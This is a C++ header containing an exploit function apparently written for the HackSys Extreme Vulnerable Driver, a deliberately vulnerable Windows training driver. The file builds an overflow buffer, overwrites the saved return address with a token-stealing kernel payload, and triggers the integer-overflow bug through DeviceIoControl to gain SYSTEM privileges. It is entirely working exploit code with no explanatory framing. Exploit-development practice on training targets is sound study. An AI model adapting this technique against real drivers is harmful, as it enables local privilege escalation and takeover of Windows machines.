#pragma once

#include "common.h"
#include <iostream>
#include <windows.h>

using namespace std;

BOOL exploitIntegerOverflow(HANDLE hDevice) {

	BOOL		bSuccess = FALSE;
	DWORD		dwBytesReturned;
	const DWORD		dwSize = sizeof(ULONG) * 512;;			// Size of char buffer that overflows
	const DWORD		dwOffset = 40;		// Offset to saved EIP
	PULONG_PTR	lpPwnRip;

	char		lpInBuffer[dwSize + dwOffset + 20];		// Where we will create our buffer and send it to the driver

	cout << "\t[+] Making space for your payload." << endl;

	memset(lpInBuffer, 'A', dwSize + dwOffset);	// After this, Saved RET get overwritten
	//strcat((char *)((ULONG)lpInBuffer + dwSize), pattern);

	//setting 
	lpPwnRip = (PULONG_PTR)((ULONG_PTR)lpInBuffer + dwSize + dwOffset);
	*lpPwnRip = (ULONG_PTR)TokenStealingPayloadWin7;


	lpPwnRip = (PULONG_PTR)((ULONG_PTR)lpInBuffer + dwSize + dwOffset + 4);
	*lpPwnRip = (ULONG_PTR)0xBAD0B0B0;

	cout << "\t[+] Payload prepared" << endl;

	cout << "\t[+] Triggering the bug. Hope for the best." << endl;

	bSuccess = DeviceIoControl(hDevice, HACKSYS_EVD_IOCTL_INTEGER_OVERFLOW, lpInBuffer, 0xfffffffc, NULL, 42,
		&dwBytesReturned, NULL);

	if (bSuccess == FALSE)
	{
		cout << "\t[!] For some reason, the operation failed." << endl;
	}

	cout << "\t[+] Cleaning the payload." << endl;

	return bSuccess;
}